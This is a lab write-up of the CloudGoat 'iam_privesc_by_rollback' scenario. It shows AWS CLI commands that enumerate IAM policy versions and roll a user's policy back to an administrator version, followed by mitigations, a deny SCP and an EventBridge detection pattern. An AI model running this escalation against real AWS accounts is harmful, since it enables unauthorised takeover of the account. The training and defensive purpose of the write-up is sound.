# AWS IAM Privilege Escalation: Policy Version Rollback

## 1. Executive Summary
* **Platform / Tooling:** CloudGoat (Rhino Security Labs), Terraform, AWS CLI v2
* **Scenario:** `iam_privesc_by_rollback`
* **Target Environment:** AWS Identity and Access Management (IAM)
* **Initial Access:** Compromised low-privileged IAM User (`Raynor`)
* **Objective:** Escalate privileges to achieve full administrative control (`AdministratorAccess`) across the AWS account.
* **Vulnerability Class:** Insecure Authorization & Policy Lifecycle Misconfiguration (Privilege Escalation via `iam:SetDefaultPolicyVersion`).

---

## 2. Technical Context & Vulnerability Architecture
AWS Customer Managed Policies support iterative updates through versioning, maintaining up to five concurrent versions (v1 through v5). When a policy is edited or updated:
1. AWS creates a new version instead of overwriting the previous document.
2. Older policy versions remain stored in the account in an inactive state unless explicitly deleted.
3. If an identity possesses the `iam:SetDefaultPolicyVersion` permission (or matching wildcards such as `iam:*` or `iam:Set*`), it can set any existing historical version as the active default version.

In this scenario, an administrator initially provisioned an over-permissive policy containing full administrative rights (`*:`*` on `*`) in version 1 (`v1`), and subsequently created more restrictive versions to limit privileges. However, the legacy `v1` version was never purged, and the target user retained the capability to switch default policy versions, enabling complete privilege escalation without creating or modifying policy bodies.

---

## 3. Offensive Lifecycle (Proof of Concept)

### Phase 1: Identity Discovery & Reconnaissance
Identify the execution context and active user ARN:
```bash
aws sts get-caller-identity --profile cg-raynor

# Obtain username dynamically and list attached policies
USER_NAME=$(aws sts get-caller-identity --profile cg-raynor --query 'Arn' --output text | cut -d'/' -f2)

aws iam list-attached-user-policies \
  --user-name "$USER_NAME" \
  --profile cg-raynor

Output: Identified attached policy ARN: arn:aws:iam::<ACCOUNT_ID>:policy/cg-raynor-policy-...


Phase 2: Policy Enumeration & Historical Audit

Enumerate all existing policy versions to locate inactive versions and inspect the current default:
Bash

aws iam list-policy-versions \
  --policy-arn <POLICY_ARN> \
  --profile cg-raynor

Inspect the statement document of the active default version (IsDefaultVersion: true):
Bash

aws iam get-policy-version \
  --policy-arn <POLICY_ARN> \
  --version-id <ACTIVE_VERSION_ID> \
  --profile cg-raynor

Finding: The active version grants read permissions alongside execution rights for version management:
JSON

{
  "Effect": "Allow",
  "Action": [
    "iam:Get*",
    "iam:List*",
    "iam:SetDefaultPolicyVersion"
  ],
  "Resource": "*"
}

Audit historical versions (v1, v2, v3, v4) to identify permissive legacy configurations:
Bash

aws iam get-policy-version \
  --policy-arn <POLICY_ARN> \
  --version-id v1 \
  --profile cg-raynor

Finding: Version v1 contains an unrestricted wildcard statement granting full administrative authority:
JSON

{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

Phase 3: Exploitation (Policy Rollback)

Leverage iam:SetDefaultPolicyVersion to revert the active policy to version v1:
Bash

aws iam set-default-policy-version \
  --policy-arn <POLICY_ARN> \
  --version-id v1 \
  --profile cg-raynor

Verify that v1 is now established as the default policy version:
Bash

aws iam list-policy-versions \
  --policy-arn <POLICY_ARN> \
  --profile cg-raynor

Phase 4: Post-Exploitation & Impact Demonstration

Validate unrestricted administrative access by querying resources that were previously denied:

    IAM Global Enumeration:
    Bash

    aws iam list-users --profile cg-raynor

    Account-Wide Storage Interaction (S3):
    Bash

    # List existing buckets
    aws s3 ls --profile cg-raynor

    # Create and delete a proof-of-concept bucket to confirm write access
    aws s3 mb s3://poc-privesc-validation-$(date +%s) --profile cg-raynor
    aws s3 ls --profile cg-raynor

4. Mitigation & Hardening Strategies
1. Enforce Principle of Least Privilege (PoLP)

    The iam:SetDefaultPolicyVersion action is functionally equivalent to full administrative takeover if any legacy version contains elevated rights.

    Restrict this action strictly to automated CI/CD deployment roles or designated Cloud Platform Administrators. Never grant iam:* or iam:Set* wildcards to standard developers or operational identities.

2. Maintain Strict Policy Hygiene

    Restricting an IAM policy must include purging legacy insecure versions. When deprecating permissions, delete older versions explicitly:
    Bash

    aws iam delete-policy-version \
      --policy-arn <POLICY_ARN> \
      --version-id <OBSOLETE_VERSION>

    Enforce Infrastructure as Code (IaC) governance via pipelines so that policy definitions are version-controlled in Git rather than managed haphazardly in the AWS management console.

3. Service Control Policies (SCPs)

In an AWS Organizations multi-account topology, prevent local account administrators or compromised identities from modifying IAM policy versions using an SCP:
JSON

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPolicyVersionTampering",
      "Effect": "Deny",
      "Action": [
        "iam:SetDefaultPolicyVersion",
        "iam:CreatePolicyVersion",
        "iam:DeletePolicyVersion"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": [
            "arn:aws:iam::*:role/OrganizationAccountAccessRole",
            "arn:aws:iam::*:role/PlatformSecurityRole"
          ]
        }
      }
    }
  ]
}

5. Detection Engineering & Incident Response
Amazon EventBridge Event Pattern

Capture invocations of SetDefaultPolicyVersion across the AWS account in real-time via AWS CloudTrail:
JSON

{
  "source": ["aws.iam"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventSource": ["iam.amazonaws.com"],
    "eventName": ["SetDefaultPolicyVersion"]
  }
}

CloudTrail Triage Fields

    detail.userIdentity.arn: Identify the actor who triggered the policy rollback.

    detail.requestParameters.policyArn: Target customer managed policy affected.

    detail.requestParameters.versionId: Specific version restored (audit the target version document immediately to scope authorization impact).

    detail.sourceIPAddress & detail.userAgent: Network origins to correlate with other indicators of compromise (IoCs).
